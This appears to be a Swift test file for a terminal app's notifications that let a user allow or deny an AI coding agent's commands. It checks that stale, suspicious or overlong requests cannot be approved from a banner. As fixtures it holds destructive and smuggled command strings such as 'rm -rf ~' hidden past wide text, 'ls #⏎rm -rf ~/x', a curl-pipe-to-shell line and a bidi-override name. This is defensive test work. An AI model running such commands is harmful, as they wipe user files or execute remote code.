import AppKit
import UserNotifications

/// The one name NotifyCenter.swift takes from the vendored Ghostty wrapper.
enum Ghostty { static let userNotificationCategory = "com.mitchellh.ghostty.userNotification" }

var failures = 0
func check(_ ok: Bool, _ what: String, line: Int = #line) {
    if !ok {
        failures += 1
        print("FAIL line \(line): \(what)")
    }
}

final class Center: NoteCenter {
    var notes: [String: AgentNote] = [:]
    var posts: [AgentNote] = []
    func post(_ note: AgentNote) {
        posts.append(note)
        notes[note.id] = note
    }
    func remove(ids: [String]) { ids.forEach { notes[$0] = nil } }
}

/// The core's answer contract (docs/core-api.md): bytes only for the surface's live, unretired,
/// unsuspicious key, consumed on use; typing retires the request.
final class FakeCore: CoreAPI {
    var live: [String: PendingRequest] = [:]
    var bytesAllow = Data("1".utf8)
    /// Every answerPermission call, as made.
    var asked: [(surfaceId: String, key: UInt64, allow: Bool)] = []
    func answerPermission(surfaceId: String, requestKey: UInt64, allow: Bool) -> Data? {
        asked.append((surfaceId, requestKey, allow))
        guard let p = live[surfaceId], p.key == requestKey, !p.suspicious else { return nil }
        live[surfaceId] = nil
        return allow ? bytesAllow : Data([0x1b])
    }
    func onUserInput(surfaceId: String) { live[surfaceId] = nil }
    func start() throws {}
    func registerSurface(cwd: String) throws -> SurfaceEnv { SurfaceEnv(surfaceId: "", nonce: "", socketPath: "") }
    func unregisterSurface(surfaceId: String) {}
    func setSurfaceInfo(surfaceId: String, title: String, cwd: String, gitBranch: String?) {}
    func selectSurface(surfaceId: String) {}
    func onOscNotification(surfaceId: String, title: String, body: String) {}
    func snapshot() -> SidebarSnapshot { SidebarSnapshot(groups: [], colorStyle: .dot) }
    func snapshotIfNewer(version: UInt64) -> SidebarSnapshot? { nil }
    func hasUnresolved(surfaceId: String) -> Bool { live[surfaceId] != nil }
    func reviewTurn(surfaceId: String) -> ReviewTurn? { nil }
    func setListener(listener: CoreListener) {}
    func decisions(query: String, limit: UInt32) -> [Decision] { [] }
    func gatePluginRequest(request: HostRequest) -> PtyWrite? { nil }
}

func row(_ id: String, _ name: String = "api-refactor", kind: RowKind = .claude, needs: Bool = false,
         pending: PendingRequest? = nil, status: String = "", meta: String = "main · Writing tests",
         progress: Progress? = nil, subs: Int = 0) -> Row {
    Row(surfaceId: id, kind: kind, name: name, meta: meta,
        task: kind == .shell ? "" : meta.range(of: " · ").map { String(meta[$0.upperBound...]) } ?? "",
        statusText: needs ? "needs you" : status, needsYou: needs,
        progress: progress, subagents: Array(repeating: Subrow(label: "Explore", meta: "1 tool"), count: subs),
        selected: false, pending: pending, color: nil)
}

func snap(_ rows: Row...) -> SidebarSnapshot { SidebarSnapshot(groups: [SidebarGroup(id: "tabs", label: "", rows: rows)], colorStyle: .dot) }

final class Harness {
    let center = Center()
    let core = FakeCore()
    var writes: [(Data, String)] = []
    var opened: [String] = []
    var focused: String?
    lazy var notifier = AgentNotifier(center: center, core: core,
                                      press: { [unowned self] k, s in self.writes.append((k.bytes, s)) },
                                      open: { [unowned self] s in self.opened.append(s) },
                                      isFocused: { [unowned self] s in self.focused == s })

    /// The core's state and the snapshot it would show, applied together.
    func show(_ rows: Row...) {
        core.live = [:]
        for r in rows { if let p = r.pending { core.live[r.surfaceId] = p } }
        notifier.update(SidebarSnapshot(groups: [SidebarGroup(id: "tabs", label: "", rows: rows)], colorStyle: .dot))
    }

    func noteFor(_ s: String) -> AgentNote? { center.notes[AgentNotifier.needsId(s)] }
}

let push = PendingRequest(key: 7, tool: "Bash", preview: "rm -rf dist && pnpm build", suspicious: false)

// Allow for the live key writes the core's bytes to that surface.
do {
    let h = Harness()
    h.show(row("s1"))
    h.show(row("s1", needs: true, pending: push))
    let n = h.noteFor("s1")
    check(n?.kind == .answer && n?.requestKey == 7, "an answerable request gets Allow/Deny: \(String(describing: n))")
    check(n?.title == "api-refactor · needs approval", "title \(n?.title ?? "nil")")
    check(n?.body == "Bash: rm -rf dist && pnpm build", "body \(n?.body ?? "nil")")
    h.notifier.respond(.allow, surfaceId: n?.surfaceId, requestKey: n?.requestKey)
    check(h.writes.count == 1 && h.writes[0].0 == Data("1".utf8) && h.writes[0].1 == "s1", "allow writes 1 to s1")
    // The core consumed it: a second click writes nothing.
    h.notifier.respond(.allow, surfaceId: n?.surfaceId, requestKey: n?.requestKey)
    check(h.writes.count == 1, "a consumed key writes nothing")
    h.show(row("s1", status: ""))
    check(h.noteFor("s1") == nil, "the note goes once the prompt is answered")
}

// Deny writes ESC.
do {
    let h = Harness()
    h.show(row("s1", needs: true, pending: push))
    h.notifier.respond(.deny, surfaceId: "s1", requestKey: 7)
    check(h.writes.map(\.0) == [Data([0x1b])], "deny writes ESC: \(h.writes)")
}

// A stale note after the prompt changed writes nothing; the note is replaced by the new prompt's.
do {
    let h = Harness()
    h.show(row("s1", needs: true, pending: push))
    let stale = h.noteFor("s1")
    let next = PendingRequest(key: 8, tool: "Bash", preview: "git push", suspicious: false)
    h.show(row("s1", needs: true, pending: next))
    check(h.noteFor("s1")?.requestKey == 8, "the delivered note now carries the new key")
    h.notifier.respond(.allow, surfaceId: stale?.surfaceId, requestKey: stale?.requestKey)
    h.notifier.respond(.deny, surfaceId: stale?.surfaceId, requestKey: stale?.requestKey)
    check(h.writes.isEmpty, "a stale key writes nothing")
    check(h.opened.isEmpty, "and shows nothing")
}

// Typing at the terminal retires the request: the note goes and its key writes nothing.
do {
    let h = Harness()
    h.show(row("s1", needs: true, pending: push))
    h.core.onUserInput(surfaceId: "s1")
    h.notifier.update(snap(row("s1", needs: true)))
    check(h.noteFor("s1") == nil, "a retired request's note is removed")
    check(h.center.posts.count == 1, "and no 'needs you' note replaces it")
    h.notifier.respond(.allow, surfaceId: "s1", requestKey: 7)
    check(h.writes.isEmpty, "a retired key writes nothing")
}

// Suspicious and unanswerable requests only open the tab.
do {
    let h = Harness()
    let odd = PendingRequest(key: 3, tool: "Bash", preview: "ls #⏎rm -rf ~/x", suspicious: true)
    h.show(row("s1", needs: true, pending: odd), row("s2", "web-ui", needs: true, meta: "main · Waiting for you"))
    let a = h.noteFor("s1"), b = h.noteFor("s2")
    check(a?.kind == .open && a?.requestKey == nil, "suspicious: no Allow action, no key: \(String(describing: a))")
    check(a?.body.contains("ls #⏎rm -rf ~/x") == true && a?.body.contains("terminal") == true, "suspicious body \(a?.body ?? "nil")")
    check(b?.kind == .open && b?.requestKey == nil && b?.title == "web-ui · needs you", "unanswerable: \(String(describing: b))")
    check(b?.body == "Waiting for you", "unanswerable body \(b?.body ?? "nil")")
    // Even a forged response with the key writes nothing: the core refuses suspicious requests.
    h.notifier.respond(.allow, surfaceId: "s1", requestKey: 3)
    check(h.writes.isEmpty, "suspicious never writes")
    // Open selects the tab.
    h.notifier.respond(.open, surfaceId: "s2", requestKey: nil)
    check(h.opened == ["s2"], "open \(h.opened)")
    // The core clearing `suspicious` under the same key (the only request left) brings Allow/Deny back, and setting it takes them away.
    let cleared = PendingRequest(key: 3, tool: "Bash", preview: "git push", suspicious: false)
    h.show(row("s1", needs: true, pending: cleared), row("s2", "web-ui", needs: true, meta: "main · Waiting for you"))
    check(h.noteFor("s1")?.kind == .answer && h.noteFor("s1")?.requestKey == 3, "suspicious cleared: Allow/Deny")
    h.show(row("s1", needs: true, pending: PendingRequest(key: 3, tool: "Bash", preview: "git push", suspicious: true)),
           row("s2", "web-ui", needs: true, meta: "main · Waiting for you"))
    check(h.noteFor("s1")?.kind == .open && h.noteFor("s1")?.requestKey == nil, "suspicious set: Open only")
    h.notifier.respond(.allow, surfaceId: "s1", requestKey: 3)
    check(h.writes.isEmpty, "a click from the earlier answerable note writes nothing once the core says terminal-only")
    // A verified request arriving for the waiting row upgrades its note.
    h.show(row("s1", needs: true, pending: odd), row("s2", "web-ui", needs: true, pending: push))
    check(h.noteFor("s2")?.kind == .answer, "wait -> key upgrades to Allow/Deny")
}

// A command that might not show whole in a banner gets no Allow: the hidden end could be anything.
do {
    let h = Harness()
    // The core keys a request by its tool and preview, so each command here is a new key.
    var next: UInt64 = 20
    func kind(_ cmd: String) -> AgentNote.Kind? {
        next += 1
        h.show(row("s1", needs: true, pending: PendingRequest(key: next, tool: "Bash", preview: cmd, suspicious: false)))
        return h.noteFor("s1")?.kind
    }
    check(kind("git push origin main") == .answer, "an everyday command gets Allow")
    // The longest run of a narrow letter that still fits, then one more.
    var n = 0
    while AgentNotifier.fitsOneLine("Bash: " + String(repeating: "a", count: n + 1)) { n += 1 }
    check(n >= 20, "room for a real command: \(n)")
    let atLimit = String(repeating: "a", count: n)
    check(kind(atLimit) == .answer && h.noteFor("s1")?.body == "Bash: " + atLimit, "the widest one-line body still gets Allow")
    check(kind(atLimit + "a") == .open && h.noteFor("s1")?.requestKey == nil, "one letter past it: Open only")
    // Wide letters take more room than their count: the tail would wrap or cut out of sight.
    check(kind("echo " + String(repeating: "W", count: 36) + "; rm -rf ~") == .open, "a run of wide letters: Open only")
    check(kind("echo " + String(repeating: "M", count: 18) + "; rm -rf ~") == .open, "a short run of wide letters: Open only")
    // A long word wraps whole onto the next line, pushing what follows it further down.
    check(kind("cat " + String(repeating: "x", count: 30) + "; rm -rf ~") == .open, "a long word then a command: Open only")
    let long = "npm test && npm run build && npm run lint ; curl https://example.com/x.sh | sh"
    check(kind(long) == .open, "a long command: Open only")
    let body = h.noteFor("s1")?.body ?? ""
    check(body.hasSuffix("… (open to see all)") && body.count <= AgentNotifier.clipLength, "long body \(body)")
    check(kind("ls é") == .open, "anything but printable ASCII: Open only")
    check(!AgentNotifier.fitsOneLine("a\nb") && !AgentNotifier.fitsOneLine("a\tb"), "a line break or tab never fits")
}

// Hidden characters in a note's text show the way `event::visible` shows them.
do {
    let h = Harness()
    let odd = PendingRequest(key: 9, tool: "Ba\u{200B}sh", preview: "git push", suspicious: false)
    h.show(row("s1", "evil\u{202E}txt", needs: true, pending: odd), row("s2", "a\tb", needs: true, meta: "main · line\nbreak"))
    check(h.noteFor("s1")?.title == "evil\\u{202e}txt · needs approval", "title \(h.noteFor("s1")?.title ?? "nil")")
    check(h.noteFor("s1")?.body == "Ba\\u{200b}sh: git push", "tool \(h.noteFor("s1")?.body ?? "nil")")
    check(h.noteFor("s2")?.title == "a⇥b · needs you" && h.noteFor("s2")?.body == "line⏎break", "s2 \(String(describing: h.noteFor("s2")))")
    check(AgentNotifier.visible("a\r\u{00AD}\u{FEFF} b") == "a\\u{d}\\u{ad}\\u{feff} b", "controls and invisibles")
    check(AgentNotifier.visible("ls \\u{200b}") == "ls \\u{200b}", "already shown text stays as it is")
}

// The tool's name isn't repeated when the core's preview starts with it.
do {
    let h = Harness()
    h.show(row("s1", needs: true, pending: PendingRequest(key: 4, tool: "Edit", preview: "Edit /w/a.rs", suspicious: false)))
    check(h.noteFor("s1")?.body == "Edit /w/a.rs", "edit body \(h.noteFor("s1")?.body ?? "nil")")
    h.show(row("s1", needs: true, pending: PendingRequest(key: 5, tool: "Bash", preview: "Bashful", suspicious: false)))
    check(h.noteFor("s1")?.body == "Bash: Bashful", "a preview that only starts with the letters keeps the tool")
    // A Bash preview is the command: a command named Bash keeps the prefix.
    h.show(row("s1", needs: true, pending: PendingRequest(key: 6, tool: "Bash", preview: "Bash foo", suspicious: false)))
    check(h.noteFor("s1")?.body == "Bash: Bash foo", "bash body \(h.noteFor("s1")?.body ?? "nil")")
    h.show(row("s1", needs: true, pending: PendingRequest(key: 12, tool: "Bash", preview: "Bash", suspicious: false)))
    check(h.noteFor("s1")?.body == "Bash: Bash", "a bare Bash command keeps it too")
}

// respond hands the core exactly the note's own surface and key, and writes to that surface.
do {
    let h = Harness()
    let other = PendingRequest(key: 11, tool: "Bash", preview: "ls", suspicious: false)
    h.show(row("s1", needs: true, pending: push), row("s2", needs: true, pending: other))
    let n = h.noteFor("s2")!
    h.notifier.respond(.deny, surfaceId: n.surfaceId, requestKey: n.requestKey)
    check(h.core.asked.count == 1 && h.core.asked[0] == ("s2", 11, false), "asked \(h.core.asked)")
    check(h.writes.count == 1 && h.writes[0].1 == "s2", "written to s2 only")
    // The key survives the trip through userInfo, the full UInt64 range included.
    let big = AgentNote(id: "needs.s", title: "", body: "", kind: .answer, surfaceId: "s", requestKey: .max)
    let info = big.userInfo as [AnyHashable: Any]
    check(AgentNote.target(info) == ("s", .max), "round trip \(AgentNote.target(info))")
    check(AgentNote.target(n.userInfo as [AnyHashable: Any]) == ("s2", 11), "a real note's info")
    let open = AgentNote(id: "done.s", title: "", body: "", kind: .open, surfaceId: "s", requestKey: nil)
    check(AgentNote.target(open.userInfo as [AnyHashable: Any]) == ("s", nil), "no key")
    check(AgentNote.target(["surfaceId": "s", "requestKey": "-1"]) == ("s", nil), "a malformed key is no key")
}

// Turning notifications off or pausing takes back every note, and Allow/Deny do nothing meanwhile.
do {
    func posted(_ change: (Harness) -> Void) -> (needs: Bool, done: Bool, wrote: Bool, asked: Bool) {
        let h = Harness()
        h.show(row("s1"), row("s2", status: "1/2"))
        h.show(row("s1", needs: true, pending: push), row("s2", status: "done"))
        change(h)
        h.notifier.respond(.allow, surfaceId: "s1", requestKey: 7)
        return (h.noteFor("s1") != nil, h.center.notes[AgentNotifier.doneId("s2")] != nil, !h.writes.isEmpty, !h.core.asked.isEmpty)
    }
    check(posted { _ in } == (true, true, true, true), "on: both notes, and Allow answers")
    check(posted { $0.notifier.settings.enabled = false } == (false, false, false, false), "enabled = false")
    check(posted { $0.notifier.paused = true } == (false, false, false, false), "paused")
    check(posted { $0.notifier.settings.onPermission = false } == (false, true, false, false), "on_permission = false")
    check(posted { $0.notifier.settings.onDone = false } == (true, false, true, true), "on_done = false")
    check(posted { $0.notifier.removeAll() } == (false, false, true, true), "removeAll takes every note back")
}

// The focused tab gets nothing; shells never notify; a note goes when its tab comes into focus.
do {
    let h = Harness()
    h.focused = "s1"
    h.show(row("s1", needs: true, pending: push), row("s3", kind: .shell))
    check(h.center.posts.isEmpty, "focused tab: no note")
    h.focused = nil
    h.show(row("s1"), row("s3", kind: .shell))
    h.show(row("s1", needs: true, pending: push))
    check(h.noteFor("s1") != nil, "unfocused tab: note")
    h.focused = "s1"
    h.show(row("s1", needs: true, pending: push))
    check(h.noteFor("s1") == nil, "focusing the tab takes the note back")
}

// Done: only on the change into done, for a row seen before; gone when it runs again or closes.
do {
    let h = Harness()
    h.show(row("s1", status: "done", meta: "main · Done in 4m"))
    check(h.center.posts.isEmpty, "a row first seen done doesn't notify")
    h.show(row("s2", status: "3/5"))
    h.show(row("s2", status: "done", meta: "main · Done in 4m"))
    let d = h.center.notes[AgentNotifier.doneId("s2")]
    check(d?.title == "api-refactor · done" && d?.body == "Done in 4m" && d?.kind == .open, "done note \(String(describing: d))")
    h.show(row("s2", status: "1/2"))
    check(h.center.notes.isEmpty, "running again removes it")
    h.show(row("s2", status: "done"))
    h.show()
    check(h.center.notes.isEmpty, "closing the tab removes its notes")
}

// [notifications] toggles and the menu's pause.
do {
    func run(_ s: NotificationSettings, paused: Bool = false) -> (perm: Bool, done: Bool) {
        let h = Harness()
        h.notifier.settings = s
        h.notifier.paused = paused
        h.show(row("s1"), row("s2"))
        h.show(row("s1", needs: true, pending: push), row("s2", status: "done"))
        return (h.noteFor("s1") != nil, h.center.notes[AgentNotifier.doneId("s2")] != nil)
    }
    var s = NotificationSettings()
    check(run(s) == (true, true), "defaults notify both")
    s.onPermission = false
    check(run(s) == (false, true), "on_permission = false")
    s = NotificationSettings()
    s.onDone = false
    check(run(s) == (true, false), "on_done = false")
    s = NotificationSettings()
    s.enabled = false
    check(run(s) == (false, false), "enabled = false")
    check(run(NotificationSettings(), paused: true) == (false, false), "paused")
}

// [notifications] parsing.
do {
    var logs: [String] = []
    let d = NotificationSettings(table: [:]) { logs.append($0) }
    check(d.enabled && d.onPermission && d.onDone && d.menuBar, "all default on")
    let toml = TOML.parse("""
    [notifications]
    on_done = false
    menu_bar = false # a comment
    enabled = "yes"
    loud = true
    """)
    let s = NotificationSettings(table: toml["notifications"] ?? [:]) { logs.append($0) }
    check(!s.onDone && !s.menuBar && s.enabled && s.onPermission, "parsed \(s)")
    check(logs.count == 2 && logs.contains { $0.contains("enabled") } && logs.contains { $0.contains("loud") }, "problems \(logs)")
}

// Config reload reports a [notifications] change, and only then.
do {
    let dir = FileManager.default.temporaryDirectory.appendingPathComponent("haunt-notify-test-\(getpid())")
    try? FileManager.default.removeItem(at: dir)
    let cfg = HauntConfig(dir: dir)
    cfg.reload()
    try! "[notifications]\non_permission = false\n".write(to: cfg.tomlURL, atomically: true, encoding: .utf8)
    let r = cfg.reload()
    check(r.notifications && !r.keys && !cfg.notifications.onPermission, "reload sees the change: \(r)")
    check(!cfg.reload().notifications, "an unchanged reload reports nothing")
    try? FileManager.default.removeItem(at: dir)
}

// The menu bar menu: the snapshot's groups, shells out, ⌘N on waiting rows only.
do {
    let s = SidebarSnapshot(groups: [
        SidebarGroup(id: "needs-you", label: "NEEDS YOU", rows: [row("a", "api-refactor", needs: true, meta: "main · approve push"),
                                                row("b", "web-ui", needs: true, meta: "main · question")]),
        SidebarGroup(id: "running", label: "RUNNING", rows: [row("c", "docs", status: "3/5", progress: Progress(done: 3, total: 5)),
                                              row("d", "infra", subs: 2), row("e", "solo", meta: "main · Thinking", subs: 1)]),
        SidebarGroup(id: "idle", label: "IDLE", rows: [row("f", "vibes", kind: .shell, meta: "~/code/vibes · zsh"),
                                           row("g", "warp", status: "done", meta: "master · Done in 4m",
                                               progress: Progress(done: 6, total: 6))]),
    ], colorStyle: .dot)
    let cmd1 = Shortcut.parse("cmd+1")!, cmd2 = Shortcut.parse("cmd+2")!, cmd3 = Shortcut.parse("cmd+3")!
    let m = StatusMenuModel(snapshot: s, keys: ["a": cmd1, "b": cmd2, "c": cmd3])
    check(m.waiting == 2, "waiting \(m.waiting)")
    check(m.sections.map(\.title) == ["Waiting on you", "Running", "Idle"], "titles \(m.sections.map(\.title))")
    check(m.sections.flatMap(\.items).map(\.text) == ["api-refactor · approve push", "web-ui · question", "docs · 3/5 tasks",
                                                       "infra · 2 subagents", "solo · 1 subagent", "warp · Done in 4m"],
          "texts \(m.sections.flatMap(\.items).map(\.text))")
    check(m.sections[0].items.map(\.key) == [cmd1, cmd2] && m.sections[1].items[0].key == nil, "keys on waiting rows only")
    check(m.sections[0].items.allSatisfy(\.filled) && !m.sections[1].items.contains(where: \.filled), "dots")
    let shells = StatusMenuModel(snapshot: SidebarSnapshot(groups: [SidebarGroup(id: "idle", label: "IDLE", rows: [row("f", kind: .shell)])], colorStyle: .dot), keys: [:])
    check(shells.sections.isEmpty && shells.waiting == 0, "shells only: no sections")
    let e = StatusMenu.entries(m, paused: false)
    check(e.first == .header("Waiting on you") && e.last == .item(text: "Pause all notifications", dot: nil, key: nil, action: .togglePause),
          "entries \(e)")
    check(StatusMenu.entries(m, paused: true).last == .item(text: "Resume notifications", dot: nil, key: nil, action: .togglePause), "paused entry")
    check(e.filter { $0 == .rule }.count == 3, "a rule after each section")
}

// While Haunt is in front: its own notes banner, Ghostty's follow its focus rule, a plugin's only lists.
do {
    func show(_ category: String, ghosttyShows: Bool = true) -> UNNotificationPresentationOptions {
        SystemNoteCenter.foreground(category: category, ghostty: Ghostty.userNotificationCategory, ghosttyShows: ghosttyShows)
    }
    check(show(SystemNoteCenter.answerCategory) == [.banner, .list] && show(SystemNoteCenter.openCategory) == [.banner, .list],
          "Haunt's notes banner")
    check(show(Ghostty.userNotificationCategory) == [.banner, .sound], "Ghostty's, away from its surface")
    check(show(Ghostty.userNotificationCategory, ghosttyShows: false) == [], "Ghostty's, over its focused surface")
    check(show("") == [.list] && show("dev.example.plugin") == [.list], "a plugin's: Notification Center only")
}

if failures > 0 {
    print("\(failures) failure(s)")
    exit(1)
}
print("notify: all passed")
